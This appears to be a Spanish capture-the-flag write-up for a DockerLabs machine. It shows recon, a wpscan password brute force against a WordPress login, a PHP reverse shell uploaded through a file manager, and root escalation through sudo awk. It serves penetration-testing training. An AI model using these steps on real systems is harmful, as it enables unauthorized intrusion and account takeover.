# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8306a2d4-ebce-443e-a0cb-d8e796bc49b0)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 9.6p1 (Ubuntu)
2. **80/tcp(HTTP):** Apache httpd 2.4.58

### Puerto 80
Al identificar que el puerto 8080 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador con el puerto y es una pagina de una universidad de ciberseguridad.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5b26eb15-db47-4c5c-bd2d-2adacec8d262)

# Fase 2- Exploración

#### FeroxBuster
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e42cccbd-681d-41de-b250-a71f74d9d9a9)
Con feroxbuster encontramos un montón de cosas, pero encontró algunas interesantes...

Encontró una directorio /wordpress
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/70c540d1-86f0-4242-9cf8-1de1bdca06a6)

Y también encontró un /wordpress/wp-admin pero lo tenemos que agregar al /etc/hosts.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/bb91ac9d-d761-4db6-8e77-e3a1b0d0eaa9)

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a9130d69-fad8-4e17-8c18-304097747739)
Despues de agregarlo ya funciona.

#### Luis
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7ad991c1-2f99-4a95-bd39-85002f24452d)

Si vemos el apartado de profesores, el profesor `Luis ;)` tiene arriba un texto que dice (admin wordpress).


# Fase 3- Exploración

#### wordpress
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b713ab72-c8e8-46be-b763-d196288eb6e3)

Al poner el nombre de usuario `Luis` nos dice que no esta registrado en wordpress.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4f307386-d3f7-46a8-b682-dca27c009c4d)

Probamos la matricula del profesor `Luis` y tampoco esta registrado.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/aa730016-31ea-48dc-8ce9-7a4a973cf894)

Si introducimos `luisillo` del correo electrónico funciona.

#### Explotar Wordpress

Utilizamos el comando:
```python
wpscan --url http://escolares.dl/wordpress/ -U luisillo --passwords /usr/share/wordlists/rockyou.txt
```
Para realizar fuerza bruta al wordpress, con el usuario `luisillo` y el `rockyou` como diccionario.

```python
[i] No Valid Passwords Found.
```
No encontró ninguna contraseña. Tocara realizar un diccionario propio.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9f8a5e9c-b6f7-4012-85d7-24098c35a7fd)

Utilizamos la herramienta `cupp` para crear un diccionario personalizado.

```python
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - luisillo / Luis1981                                                                                                                                                                             
Trying luisillo / Luis1098181
```
Nos encontró la contraseña!

#### Wp-File-Manager
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f09a5289-2ade-4c97-88b9-87ddeba7ea0e)

Dentro de wordpress encontramos un File Manager.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ae7f2758-4e12-4402-a8dd-bf10608425ff)

El tema `twentytwentyfour` nos permite ver y ejecutar archivos.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9f8aa99b-9133-4a0f-ba1d-a83e057b6c8e)

Creamos un archivo .txt de texto plano.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/44864bfb-a261-4e13-8c9b-1cdfae13405e)

Pegamos el codigo de `https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php` y le cambiamos la ip y el puerto.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e920fc5b-714a-4887-82d3-ebc77ee083d0)

Le damos a `SAVE AS` y lo guardamos con cualquier nombre y extensión `.php`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/0ce9e06b-d5a2-4509-999b-9d8865ba4576)

Y ahi lo tenemos.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/59748050-eefb-4b82-9bbf-7a7db5fea34d)
Nos ponemos en modo escucha y ejecutamos el archivo y nos llega la reverse shell.

# Fase 4- Privilegios

#### www-data
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c94f7177-1c4f-49e6-9b87-1692b6963ab6)

Despues de realizar el tratamiento de la TTY y no encontrar nada en los binarios reviso el passwd y veo que existe el usuario `luisillo`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/44cb1e15-f263-4924-8830-01d706a54a11)

En el directorio `/home` existe un archivo llamado `secret.txt`
```python
www-data@16f9cdd90725:/home$ ls  
luisillo  secret.txt  ubuntu
www-data@16f9cdd90725:/home$ cat secret.txt 
luisillopasswordsecret
www-data@16f9cdd90725:/home$ su luisillo
Password: 
luisillo@16f9cdd90725:/home$ 
```
Y somos el usuario `luisillo`!.

#### Luisillo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4ac9b5b1-4a90-4716-b96e-0797f48f6651)

Como el usuario `luisillo` podemos ejecutar el binario `awk` como usuario root.
```
luisillo@16f9cdd90725:/home$ sudo awk 'BEGIN {system("/bin/sh")}'
# whoami
root
# 
```
Buscamos como se eleva privilegios en gtfobins con ese binario y escalamos!.
